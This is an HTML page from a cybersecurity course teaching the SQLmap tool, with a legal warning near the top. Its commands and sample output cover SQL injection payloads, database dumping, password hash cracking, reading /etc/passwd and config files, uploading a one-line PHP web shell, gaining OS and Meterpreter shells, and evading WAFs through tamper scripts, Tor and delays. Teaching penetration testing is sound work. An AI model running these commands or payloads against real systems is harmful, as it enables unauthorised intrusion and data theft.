@@ -1,0 +1,961 @@
+<!DOCTYPE html>
+<html lang="en" dir="ltr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>SQLmap — Cybersecurity Course</title>
+    <link rel="stylesheet" href="style.css">
+    <meta name="description" content="SQLmap course — learn automated SQL injection detection, exploitation, database enumeration, and data extraction.">
+</head>
+<body>
+
+<header>
+    <div class="logo">
+        <a href="index.html">BIT+</a>
+    </div>
+    <nav>
+        <a href="https://github.com/mu-b003" target="_blank">GitHub</a>
+        <a href="notes.html">Notes</a>
+    </nav>
+</header>
+
+<div class="ads-wrapper-layout">
+<div class="content-container">
+
+<details open>
+  <summary>Introduction — What is SQLmap?</summary>
+  <p>SQLmap is the most powerful open-source tool for automated SQL injection detection and exploitation. It can detect vulnerabilities, fingerprint the database, extract data, read and write files on the server, and even gain operating system access — all automatically.</p>
+  <h3>What Can SQLmap Do?</h3>
+  <p>Detect SQL injection vulnerabilities — Identify the database type and version — Enumerate databases, tables, and columns — Dump data from any table — Crack password hashes — Read and write files on the server — Execute OS commands — Bypass WAFs and filters.</p>
+  <h3>Supported Databases</h3>
+  <pre>
+MySQL        MariaDB      PostgreSQL    Microsoft SQL Server
+Oracle       SQLite       IBM DB2       Firebird
+Sybase       SAP MaxDB    HSQLDB        H2
+MonetDB      Apache Derby Amazon Redshift  CockroachDB
+  </pre>
+  <h3>Installation</h3>
+  <pre>
+# Kali Linux (pre-installed)
+sqlmap --version
+
+# Linux — from Git
+git clone https://github.com/sqlmapproject/sqlmap.git
+cd sqlmap
+python3 sqlmap.py --version
+
+# pip
+pip3 install sqlmap
+
+# Windows
+# Download ZIP from https://sqlmap.org
+# Run: python sqlmap.py [options]
+  </pre>
+  <h3>Legal Warning</h3>
+  <p>Only run SQLmap against systems you own or have explicit written permission to test. Unauthorized use is illegal in most countries and carries serious criminal penalties.</p>
+</details>
+
+<details open>
+  <summary>Basic Usage — First Scan</summary>
+  <h3>Basic Syntax</h3>
+  <pre>
+sqlmap -u "URL" [options]
+  </pre>
+  <h3>Your First Scan</h3>
+  <pre>
+# Test a URL with a GET parameter
+sqlmap -u "http://target.com/page.php?id=1"
+
+# SQLmap will:
+# 1. Test the "id" parameter for SQL injection
+# 2. Report if the parameter is injectable
+# 3. Identify the injection type and database
+  </pre>
+  <h3>Understanding the Output</h3>
+  <pre>
+[INFO]  testing connection to the target URL
+[INFO]  testing if the target URL content is stable
+[INFO]  testing if GET parameter 'id' is dynamic
+[INFO]  heuristic (basic) test shows that GET parameter
+        'id' might be injectable (possible DBMS: 'MySQL')
+[INFO]  testing for SQL injection on GET parameter 'id'
+
+---
+Parameter: id (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: id=1 AND 2242=2242
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind
+    Payload: id=1 AND SLEEP(5)
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 1 to 20 columns
+    Payload: id=-7381 UNION ALL SELECT NULL,NULL,...
+---
+[INFO]  the back-end DBMS is MySQL
+  </pre>
+  <h3>Interactive Questions</h3>
+  <p>SQLmap asks questions during the scan. Common answers:</p>
+  <pre>
+it looks like the back-end DBMS is 'MySQL'. Do you want to skip
+test payloads specific for other DBMSes? [Y/n]  → Y
+
+for the remaining tests, do you want to include all tests for
+'MySQL' extending provided level/risk values? [Y/n]  → Y
+
+GET parameter 'id' is vulnerable. Do you want to keep testing
+the others? [y/N]  → N  (stop when first vuln found)
+
+do you want to exploit this SQL injection? [Y/n]  → Y
+  </pre>
+  <h3>Skip Questions — Non-Interactive Mode</h3>
+  <pre>
+sqlmap -u "http://target.com/page.php?id=1" --batch
+  </pre>
+  <p>--batch answers all questions with the default (recommended) answer automatically. Use this for scripting or when you want no interruptions.</p>
+</details>
+
+<details>
+  <summary>Target Specification</summary>
+  <h3>GET Parameter</h3>
+  <pre>
+sqlmap -u "http://target.com/page.php?id=1"
+sqlmap -u "http://target.com/items?category=phones&id=5"
+  </pre>
+  <h3>POST Request</h3>
+  <pre>
+# Specify POST data with --data
+sqlmap -u "http://target.com/login" \
+       --data "username=admin&password=test"
+
+# SQLmap tests all POST parameters by default
+# To test a specific one:
+sqlmap -u "http://target.com/login" \
+       --data "username=admin&password=test" \
+       -p username
+  </pre>
+  <h3>From a Saved Request File (Burp Suite)</h3>
+  <pre>
+# In Burp Suite:
+# Right-click any request → Save item → save as request.txt
+
+# Run SQLmap with the file
+sqlmap -r request.txt
+
+# This is the most reliable method — includes all headers,
+# cookies, and POST body exactly as captured
+  </pre>
+  <h3>Cookie Parameter</h3>
+  <pre>
+# Test a parameter inside a cookie
+sqlmap -u "http://target.com/dashboard" \
+       --cookie "session=abc123; user_id=5" \
+       -p user_id
+  </pre>
+  <h3>HTTP Headers</h3>
+  <pre>
+# Test a custom header (e.g. X-Forwarded-For)
+sqlmap -u "http://target.com/" \
+       --headers="X-Forwarded-For: 1*"
+
+# Test the User-Agent header
+sqlmap -u "http://target.com/" \
+       --user-agent="Mozilla/5.0*"
+
+# Test the Referer header
+sqlmap -u "http://target.com/" \
+       --referer="http://target.com/*"
+  </pre>
+  <h3>JSON and XML Body</h3>
+  <pre>
+# JSON POST body
+sqlmap -u "http://target.com/api/user" \
+       --data='{"id":1,"name":"test"}' \
+       --headers="Content-Type: application/json"
+
+# XML POST body
+sqlmap -u "http://target.com/api" \
+       --data='&lt;user&gt;&lt;id&gt;1&lt;/id&gt;&lt;/user&gt;' \
+       --headers="Content-Type: application/xml"
+  </pre>
+  <h3>Authentication</h3>
+  <pre>
+# HTTP Basic Auth
+sqlmap -u "http://target.com/admin/" \
+       --auth-type=Basic \
+       --auth-cred="admin:password"
+
+# Session cookie (most common)
+sqlmap -u "http://target.com/dashboard" \
+       --cookie="PHPSESSID=abc123def456"
+
+# Bearer token
+sqlmap -u "http://target.com/api/data" \
+       --headers="Authorization: Bearer eyJhbGci..."
+  </pre>
+</details>
+
+<details>
+  <summary>Injection Techniques</summary>
+  <h3>Six Injection Techniques</h3>
+  <p>SQLmap supports all six standard SQL injection techniques. Each works differently — some are fast, some are slow, some work when others fail.</p>
+  <h3>B — Boolean-based Blind</h3>
+  <pre>
+How it works:
+The query returns different content based on TRUE/FALSE conditions.
+SQLmap asks yes/no questions to extract data one bit at a time.
+
+Example payload:
+id=1 AND 1=1--   → normal page (TRUE)
+id=1 AND 1=2--   → different/empty page (FALSE)
+
+Speed: Medium — requires many requests per character
+  </pre>
+  <h3>E — Error-based</h3>
+  <pre>
+How it works:
+Forces the database to include data inside error messages.
+The data appears directly in the response.
+
+Example payload:
+id=1 AND EXTRACTVALUE(1,CONCAT(0x7e,version()))--
+Response contains: ~8.0.28-MySQL Community Server
+
+Speed: Fast — one request per value
+  </pre>
+  <h3>U — UNION-based</h3>
+  <pre>
+How it works:
+Appends a UNION SELECT statement to inject a second query.
+Results appear directly in the page output.
+
+Example payload:
+id=-1 UNION SELECT 1,database(),user()--
+Page shows: myapp | root@localhost
+
+Speed: Fastest — full data in one request
+Requirements: Application must reflect query results in the page
+  </pre>
+  <h3>S — Stacked Queries</h3>
+  <pre>
+How it works:
+Executes multiple SQL statements separated by semicolons.
+
+Example payload:
+id=1; DROP TABLE users--
+id=1; INSERT INTO admins VALUES('hacker','pass')--
+
+Speed: Varies
+Requirements: Database must support multiple statements
+              (MySQL with certain drivers, MSSQL, PostgreSQL)
+  </pre>
+  <h3>T — Time-based Blind</h3>
+  <pre>
+How it works:
+Injects a time delay — if the condition is TRUE the response
+is delayed. Data extracted one bit at a time by timing responses.
+
+Example payload:
+id=1 AND SLEEP(5)--           (MySQL)
+id=1; WAITFOR DELAY '0:0:5'-- (MSSQL)
+id=1 AND pg_sleep(5)--        (PostgreSQL)
+
+Speed: Slowest — each character requires multiple delayed requests
+Use when: No output is reflected at all (fully blind)
+  </pre>
+  <h3>Q — Inline Queries</h3>
+  <pre>
+How it works:
+Embeds a subquery within the original query.
+
+Example payload:
+id=(SELECT 1)
+
+Speed: Fast
+  </pre>
+  <h3>Specifying Techniques</h3>
+  <pre>
+# Use all techniques (default)
+sqlmap -u "http://target.com/?id=1"
+
+# Use only UNION and error-based (fast)
+sqlmap -u "http://target.com/?id=1" --technique=UE
+
+# Use only time-based (when everything else fails)
+sqlmap -u "http://target.com/?id=1" --technique=T
+
+# Technique codes: B E U S T Q
+  </pre>
+</details>
+
+<details>
+  <summary>Database Enumeration</summary>
+  <h3>Step-by-Step Data Extraction</h3>
+  <p>Once SQLmap confirms a vulnerability, you enumerate the database from the top level down: databases → tables → columns → data.</p>
+  <h3>Step 1 — Get Database Version and Info</h3>
+  <pre>
+# Database version
+sqlmap -u "http://target.com/?id=1" --banner
+
+# Current database user
+sqlmap -u "http://target.com/?id=1" --current-user
+
+# Current database name
+sqlmap -u "http://target.com/?id=1" --current-db
+
+# Check if user has DBA (admin) privileges
+sqlmap -u "http://target.com/?id=1" --is-dba
+
+# Get hostname
+sqlmap -u "http://target.com/?id=1" --hostname
+  </pre>
+  <h3>Step 2 — List All Databases</h3>
+  <pre>
+sqlmap -u "http://target.com/?id=1" --dbs
+
+# Output example:
+available databases [5]:
+[*] information_schema
+[*] myapp
+[*] mysql
+[*] performance_schema
+[*] sys
+  </pre>
+  <h3>Step 3 — List Tables in a Database</h3>
+  <pre>
+sqlmap -u "http://target.com/?id=1" -D myapp --tables
+
+# Output example:
+Database: myapp
+[4 tables]:
++----------+
+| users    |
+| orders   |
+| products |
+| sessions |
++----------+
+  </pre>
+  <h3>Step 4 — List Columns in a Table</h3>
+  <pre>
+sqlmap -u "http://target.com/?id=1" -D myapp -T users --columns
+
+# Output example:
+Database: myapp
+Table: users
+[6 columns]:
++------------+--------------+
+| Column     | Type         |
++------------+--------------+
+| id         | int(11)      |
+| username   | varchar(50)  |
+| password   | varchar(255) |
+| email      | varchar(100) |
+| role       | varchar(20)  |
+| created_at | datetime     |
++------------+--------------+
+  </pre>
+  <h3>Step 5 — Dump Table Data</h3>
+  <pre>
+# Dump entire table
+sqlmap -u "http://target.com/?id=1" \
+       -D myapp -T users --dump
+
+# Dump specific columns only
+sqlmap -u "http://target.com/?id=1" \
+       -D myapp -T users -C username,password,email --dump
+
+# Dump with a WHERE condition
+sqlmap -u "http://target.com/?id=1" \
+       -D myapp -T users \
+       --where="role='admin'" --dump
+
+# Dump first 10 rows only
+sqlmap -u "http://target.com/?id=1" \
+       -D myapp -T users --dump \
+       --start=1 --stop=10
+  </pre>
+  <h3>Dump All Databases at Once</h3>
+  <pre>
+# Dump everything (use carefully — can be very slow)
+sqlmap -u "http://target.com/?id=1" --dump-all
+
+# Dump all but skip system databases
+sqlmap -u "http://target.com/?id=1" \
+       --dump-all --exclude-sysdbs
+  </pre>
+  <h3>List Database Users and Privileges</h3>
+  <pre>
+# List all DB users
+sqlmap -u "http://target.com/?id=1" --users
+
+# Get password hashes for all users
+sqlmap -u "http://target.com/?id=1" --passwords
+
+# Get privileges of each user
+sqlmap -u "http://target.com/?id=1" --privileges
+
+# Get roles (Oracle, PostgreSQL)
+sqlmap -u "http://target.com/?id=1" --roles
+  </pre>
+</details>
+
+<details>
+  <summary>Password Cracking</summary>
+  <h3>Automatic Hash Cracking</h3>
+  <p>When SQLmap dumps password hashes, it automatically offers to crack them using a dictionary attack.</p>
+  <pre>
+sqlmap -u "http://target.com/?id=1" \
+       -D myapp -T users -C username,password --dump
+
+# SQLmap detects hash type and asks:
+do you want to crack them via a dictionary-based attack? [Y/n/q]
+→ Y
+
+# It uses its built-in wordlist first, then asks for custom ones
+  </pre>
+  <h3>Supported Hash Types</h3>
+  <pre>
+MySQL:       *HASH  (SHA1 of SHA1)
+MD5:         32-character hex
+SHA1:        40-character hex
+SHA256:      64-character hex
+bcrypt:      $2a$... or $2b$...
+PostgreSQL:  md5 + username prefix
+MSSQL:       0x0100... format
+Oracle:      DES-based or SHA1
+  </pre>
+  <h3>Using a Custom Wordlist</h3>
+  <pre>
+sqlmap -u "http://target.com/?id=1" \
+       -D myapp -T users --dump \
+       --passwords \
+       --wordlist=/usr/share/wordlists/rockyou.txt
+  </pre>
+  <h3>Cracking Externally with Hashcat</h3>
+  <pre>
+# Save the hash from SQLmap output to a file
+echo "5f4dcc3b5aa765d61d8327deb882cf99" > hash.txt
+
+# Crack MD5 with rockyou
+hashcat -m 0 hash.txt /usr/share/wordlists/rockyou.txt
+
+# Crack MySQL hash
+hashcat -m 300 hash.txt /usr/share/wordlists/rockyou.txt
+
+# Crack bcrypt
+hashcat -m 3200 hash.txt /usr/share/wordlists/rockyou.txt
+  </pre>
+</details>
+
+<details>
+  <summary>File System Access</summary>
+  <h3>Reading Files from the Server</h3>
+  <p>If the database user has FILE privilege, SQLmap can read files directly from the server's filesystem.</p>
+  <pre>
+# Read /etc/passwd
+sqlmap -u "http://target.com/?id=1" \
+       --file-read="/etc/passwd"
+
+# Read a web application config file
+sqlmap -u "http://target.com/?id=1" \
+       --file-read="/var/www/html/config.php"
+
+# Read Windows SAM database (requires SYSTEM privilege)
+sqlmap -u "http://target.com/?id=1" \
+       --file-read="C:/Windows/System32/config/SAM"
+
+# Read Windows web app config
+sqlmap -u "http://target.com/?id=1" \
+       --file-read="C:/inetpub/wwwroot/web.config"
+
+# Files are saved locally to:
+# ~/.sqlmap/output/target.com/files/
+  </pre>
+  <h3>Writing Files to the Server</h3>
+  <pre>
+# Write a PHP web shell to the web root
+sqlmap -u "http://target.com/?id=1" \
+       --file-write="shell.php" \
+       --file-dest="/var/www/html/shell.php"
+
+# Create the shell.php locally first:
+echo '&lt;?php system($_GET["cmd"]); ?&gt;' > shell.php
+
+# After upload, access it:
+# http://target.com/shell.php?cmd=id
+# http://target.com/shell.php?cmd=whoami
+  </pre>
+  <h3>Requirements for File Operations</h3>
+  <pre>
+Read files:
+ Database user must have FILE privilege
+ file_priv = Y in mysql.user table
+ File must be readable by the MySQL process user
+
+Write files:
+ FILE privilege required
+ secure_file_priv must be empty or set to the target dir
+ Web server must have write access to the destination
+ You must know the absolute path to the web root
+
+Check current privileges:
+sqlmap -u "http://target.com/?id=1" --privileges
+sqlmap -u "http://target.com/?id=1" --is-dba
+  </pre>
+</details>
+
+<details>
+  <summary>OS Command Execution</summary>
+  <h3>Operating System Shell</h3>
+  <p>In certain conditions SQLmap can execute operating system commands directly — the most severe outcome of SQL injection exploitation.</p>
+  <h3>--os-shell</h3>
+  <pre>
+sqlmap -u "http://target.com/?id=1" --os-shell
+
+# SQLmap will:
+# 1. Upload a web shell (via file-write)
+# 2. Give you an interactive OS shell prompt
+# 3. You can run commands directly:
+
+os-shell> id
+os-shell> whoami
+os-shell> cat /etc/passwd
+os-shell> ls /var/www/html
+  </pre>
+  <h3>--os-cmd — Single Command</h3>
+  <pre>
+# Execute a single OS command
+sqlmap -u "http://target.com/?id=1" \
+       --os-cmd="id"
+
+sqlmap -u "http://target.com/?id=1" \
+       --os-cmd="cat /etc/shadow"
+  </pre>
+  <h3>--os-pwn — Meterpreter Shell</h3>
+  <pre>
+# Get a full Meterpreter or VNC session via Metasploit
+sqlmap -u "http://target.com/?id=1" --os-pwn
+
+# SQLmap asks for:
+# — Shell type: Meterpreter or VNC
+# — Connection type: Reverse TCP or Bind TCP
+# — LHOST and LPORT for reverse connection
+
+# Requires Metasploit Framework installed
+  </pre>
+  <h3>Requirements for OS Execution</h3>
+  <pre>
+Via UDF (User Defined Function) — MySQL/PostgreSQL:
+ DBA privileges required
+ File read/write access
+ SQLmap uploads a compiled UDF library
+
+Via xp_cmdshell — MSSQL:
+ sysadmin role required
+ xp_cmdshell enabled (or SQLmap enables it automatically)
+
+Via COPY TO/FROM PROGRAM — PostgreSQL:
+ Superuser required
+  </pre>
+</details>
+
+<details>
+  <summary>Bypassing WAF and Filters</summary>
+  <h3>What is a WAF?</h3>
+  <p>A Web Application Firewall (WAF) filters HTTP requests and blocks known attack patterns. SQLmap has many built-in techniques and tamper scripts to evade detection.</p>
+  <h3>Level and Risk</h3>
+  <pre>
+--level  — Controls how many tests are run (1-5, default: 1)
+           Higher = more payloads, more parameters tested
+           Level 5 also tests HTTP headers (User-Agent, Referer)
+
+--risk   — Controls how dangerous the payloads are (1-3, default: 1)
+           Risk 2 adds heavy time-based tests
+           Risk 3 adds OR-based tests (can modify data — use carefully)
+
+# More thorough scan
+sqlmap -u "http://target.com/?id=1" --level=5 --risk=3
+  </pre>
+  <h3>Tamper Scripts</h3>
+  <p>Tamper scripts transform payloads to bypass WAF signatures. Over 60 are included with SQLmap.</p>
+  <pre>
+# Use a tamper script
+sqlmap -u "http://target.com/?id=1" --tamper=space2comment
+
+# Use multiple tamper scripts
+sqlmap -u "http://target.com/?id=1" \
+       --tamper=space2comment,between,randomcase
+  </pre>
+  <h3>Most Useful Tamper Scripts</h3>
+  <pre>
+space2comment      — Replaces spaces with /**/
+                     1 UNION SELECT → 1/**/UNION/**/SELECT
+
+between            — Replaces > with BETWEEN
+                     Bypasses comparison operator filters
+
+randomcase         — Randomizes letter case
+                     union select → uNiOn SeLeCt
+
+charencode         — URL-encodes characters
+                     ' → %27
+
+chardoubleencode   — Double URL-encodes
+                     ' → %2527
+
+base64encode       — Base64 encodes the payload
+
+equaltolike        — Replaces = with LIKE
+                     WHERE id=1 → WHERE id LIKE 1
+
+greatest           — Replaces > with GREATEST()
+                     Bypasses > operator filters
+
+hexencode          — Converts strings to hex
+                     'admin' → 0x61646d696e
+
+modsecurityversioned — Wraps queries in versioned comments
+                       /*!50000...*/
+
+space2dash         — Replaces spaces with dash comment
+                     1 UNION SELECT → 1--\nUNION--\nSELECT
+
+space2mssqlhash    — Replaces spaces with %23%0A (MSSQL)
+
+versionedkeywords  — Wraps MySQL keywords in version comments
+                     UNION → /*!UNION*/
+  </pre>
+  <h3>Evasion Options</h3>
+  <pre>
+# Add a random delay between requests (avoid rate limiting)
+sqlmap -u "http://target.com/?id=1" --delay=2
+
+# Randomize HTTP headers
+sqlmap -u "http://target.com/?id=1" --random-agent
+
+# Use a specific User-Agent
+sqlmap -u "http://target.com/?id=1" \
+       --user-agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+
+# Use a proxy (route through Burp or Tor)
+sqlmap -u "http://target.com/?id=1" \
+       --proxy="http://127.0.0.1:8080"
+
+# Route through Tor
+sqlmap -u "http://target.com/?id=1" --tor --tor-type=SOCKS5
+
+# Set custom HTTP headers
+sqlmap -u "http://target.com/?id=1" \
+       --headers="X-Forwarded-For: 127.0.0.1\nX-Custom: value"
+
+# Ignore 429 rate limit responses and keep trying
+sqlmap -u "http://target.com/?id=1" \
+       --ignore-code=429
+  </pre>
+  <h3>Finding the Right Tamper</h3>
+  <pre>
+# List all available tamper scripts with descriptions
+sqlmap --list-tampers
+
+# For MySQL + spaces blocked
+--tamper=space2comment,randomcase
+
+# For MSSQL
+--tamper=space2mssqlhash,between
+
+# For generic WAF bypass
+--tamper=randomcase,charencode,space2comment,between
+
+# For ModSecurity
+--tamper=modsecurityversioned,space2comment
+  </pre>
+</details>
+
+<details>
+  <summary>Performance and Optimization</summary>
+  <h3>Speed Up Scans</h3>
+  <pre>
+# Increase threads (parallel requests)
+sqlmap -u "http://target.com/?id=1" --threads=10
+# Default: 1 — Max recommended: 10
+
+# Skip time-consuming tests
+sqlmap -u "http://target.com/?id=1" \
+       --technique=UEB   -- skip time-based (T)
+
+# Specify the DBMS to skip detection phase
+sqlmap -u "http://target.com/?id=1" --dbms=MySQL
+sqlmap -u "http://target.com/?id=1" --dbms=PostgreSQL
+sqlmap -u "http://target.com/?id=1" --dbms=MSSQL
+
+# Specify OS to narrow payloads
+sqlmap -u "http://target.com/?id=1" --os=Linux
+sqlmap -u "http://target.com/?id=1" --os=Windows
+  </pre>
+  <h3>Reduce Noise and Requests</h3>
+  <pre>
+# Only test a specific parameter
+sqlmap -u "http://target.com/?id=1&page=home" -p id
+
+# Skip testing other parameters if one is found
+sqlmap -u "http://target.com/?id=1" --stop-on-first
+
+# Assume the server is running a specific DBMS
+# (skip fingerprinting — saves many requests)
+sqlmap -u "http://target.com/?id=1" \
+       --dbms=mysql --batch
+
+# Set timeout to avoid hanging on slow responses
+sqlmap -u "http://target.com/?id=1" --timeout=10
+  </pre>
+  <h3>Resume and Save Sessions</h3>
+  <pre>
+# SQLmap automatically saves session data to:
+# ~/.sqlmap/output/target.com/
+
+# Resume an interrupted scan automatically
+# Just run the same command again — SQLmap continues from where it stopped
+
+# Clear session for a fresh scan
+sqlmap -u "http://target.com/?id=1" --flush-session
+
+# Save all HTTP traffic to a file for review
+sqlmap -u "http://target.com/?id=1" \
+       --traffic-file=traffic.log
+  </pre>
+  <h3>Output Control</h3>
+  <pre>
+-v 0    — Show only critical messages
+-v 1    — Show errors and warnings (default)
+-v 2    — Show info messages
+-v 3    — Show payloads being sent
+-v 4    — Show HTTP requests
+-v 5    — Show HTTP responses
+-v 6    — Show HTTP response content
+
+# Recommended for learning:
+sqlmap -u "http://target.com/?id=1" -v 3
+
+# Save output to file
+sqlmap -u "http://target.com/?id=1" \
+       --output-dir=/tmp/sqlmap_results
+  </pre>
+</details>
+
+<details>
+  <summary>Practical Workflows</summary>
+  <h3>Workflow 1 — From Burp Suite to SQLmap</h3>
+  <pre>
+# This is the most reliable real-world workflow
+
+Step 1: In Burp Suite, find a request with an interesting parameter
+Step 2: Right-click the request → Save item → save as req.txt
+Step 3: Run SQLmap with the saved request
+
+sqlmap -r req.txt --batch --level=2
+
+Step 4: Once vulnerability confirmed, enumerate:
+sqlmap -r req.txt --current-db
+sqlmap -r req.txt --dbs
+sqlmap -r req.txt -D targetdb --tables
+sqlmap -r req.txt -D targetdb -T users --dump
+  </pre>
+  <h3>Workflow 2 — Login Form Testing</h3>
+  <pre>
+# Capture the login POST request in Burp → save as login.txt
+# Contents:
+# POST /login HTTP/1.1
+# Host: target.com
+# Content-Type: application/x-www-form-urlencoded
+#
+# username=admin&password=test
+
+sqlmap -r login.txt --batch --level=3 --risk=2
+
+# If vulnerable, dump users table:
+sqlmap -r login.txt -D app -T users \
+       -C username,password --dump \
+       --batch
+  </pre>
+  <h3>Workflow 3 — Blind SQLi (No Output)</h3>
+  <pre>
+# When the page looks the same regardless of input
+# Use time-based or boolean-based technique
+
+# Time-based only
+sqlmap -u "http://target.com/?id=1" \
+       --technique=T \
+       --time-sec=3 \
+       --batch \
+       --current-db
+
+# Boolean-based only
+sqlmap -u "http://target.com/?id=1" \
+       --technique=B \
+       --batch \
+       --current-db
+
+# Combine with higher level for better detection
+sqlmap -u "http://target.com/?id=1" \
+       --level=3 --risk=2 --batch
+  </pre>
+  <h3>Workflow 4 — WAF Bypass</h3>
+  <pre>
+Step 1: Try a basic scan first
+sqlmap -u "http://target.com/?id=1" --batch
+
+Step 2: If blocked, identify the WAF
+sqlmap -u "http://target.com/?id=1" --identify-waf
+
+Step 3: Apply appropriate tamper scripts
+sqlmap -u "http://target.com/?id=1" \
+       --tamper=space2comment,randomcase,between \
+       --random-agent \
+       --delay=1 \
+       --batch
+
+Step 4: Increase level and risk if still failing
+sqlmap -u "http://target.com/?id=1" \
+       --tamper=space2comment,charencode \
+       --level=5 --risk=3 \
+       --random-agent \
+       --batch
+  </pre>
+  <h3>Workflow 5 — Full Automated Dump</h3>
+  <pre>
+# One command to find vulnerability and dump everything
+sqlmap -u "http://target.com/?id=1" \
+       --batch \
+       --level=2 \
+       --risk=2 \
+       --random-agent \
+       --threads=5 \
+       --dbs
+
+# Then dump the interesting database
+sqlmap -u "http://target.com/?id=1" \
+       --batch \
+       --threads=5 \
+       -D targetdb \
+       --dump-all \
+       --exclude-sysdbs
+  </pre>
+</details>
+
+<details>
+  <summary>SQLmap Cheat Sheet</summary>
+  <h3>Target Options</h3>
+  <pre>
+-u URL              — Target URL
+-r file             — Load request from file (Burp)
+--data="x=1"        — POST body data
+--cookie="c=val"    — Cookie header
+-p param            — Test only this parameter
+--dbms=MySQL        — Skip DBMS detection
+--os=Linux          — Specify target OS
+--batch             — Non-interactive mode
+  </pre>
+  <h3>Injection Techniques</h3>
+  <pre>
+--technique=BEUSTQ  — All techniques (default)
+--technique=U       — UNION only (fast)
+--technique=T       — Time-based only (blind)
+--technique=B       — Boolean-based only
+--time-sec=5        — Delay for time-based (default: 5)
+--level=1-5         — Test depth (default: 1)
+--risk=1-3          — Payload risk (default: 1)
+  </pre>
+  <h3>Enumeration</h3>
+  <pre>
+--banner            — DB version
+--current-user      — Current DB user
+--current-db        — Current database
+--is-dba            — Check DBA privilege
+--hostname          — Server hostname
+--dbs               — List all databases
+--tables            — List tables (-D db)
+--columns           — List columns (-D db -T table)
+--dump              — Dump data
+--dump-all          — Dump everything
+--exclude-sysdbs    — Skip system databases
+--users             — List DB users
+--passwords         — Get password hashes
+--privileges        — Show user privileges
+-D db               — Target database
+-T table            — Target table
+-C col1,col2        — Target columns
+--start=1 --stop=10 — Row range
+--where="cond"      — Filter rows
+  </pre>
+  <h3>File and OS</h3>
+  <pre>
+--file-read=path    — Read server file
+--file-write=local  — Local file to upload
+--file-dest=path    — Destination on server
+--os-shell          — Interactive OS shell
+--os-cmd="cmd"      — Execute single command
+--os-pwn            — Meterpreter session
+  </pre>
+  <h3>Evasion</h3>
+  <pre>
+--tamper=script     — Apply tamper script
+--random-agent      — Random User-Agent
+--delay=N           — Delay between requests (sec)
+--proxy=URL         — Route through proxy
+--tor               — Route through Tor
+--ignore-code=N     — Ignore HTTP status code
+--threads=N         — Parallel threads (max 10)
+--timeout=N         — Request timeout
+--flush-session     — Clear saved session
+--identify-waf      — Detect WAF type
+  </pre>
+  <h3>Output</h3>
+  <pre>
+-v 0-6              — Verbosity level
+--output-dir=path   — Save results to directory
+--traffic-file=log  — Save HTTP traffic
+--list-tampers      — Show all tamper scripts
+  </pre>
+  <h3>Most Common Full Commands</h3>
+  <pre>
+# Quick test
+sqlmap -u "URL?id=1" --batch --dbs
+
+# From Burp request file
+sqlmap -r req.txt --batch --level=2 --dbs
+
+# Dump users table
+sqlmap -r req.txt --batch -D app -T users --dump
+
+# WAF bypass
+sqlmap -r req.txt --batch --tamper=space2comment,randomcase \
+       --random-agent --level=3 --risk=2
+
+# Full stealth scan
+sqlmap -r req.txt --batch --random-agent --delay=2 \
+       --threads=1 --technique=T --level=5
+  </pre>
+</details>
+
+</div>
+</div>
+
+<footer class="site-footer">
+    <div class="footer-container">
+        <div class="footer-right">
+            <span>BIT+ Platform</span>
+            <span>|</span>
+            <span>&copy; 2026 All rights reserved.</span>
+        </div>
+        <div class="footer-left">
+            <a href="about.html">About Us</a>
+            <a href="privacy-policy.html">Privacy Policy</a>
+            <a href="contact.html">Contact Us</a>
+        </div>
+    </div>
+</footer>
+
+</body>
+</html>
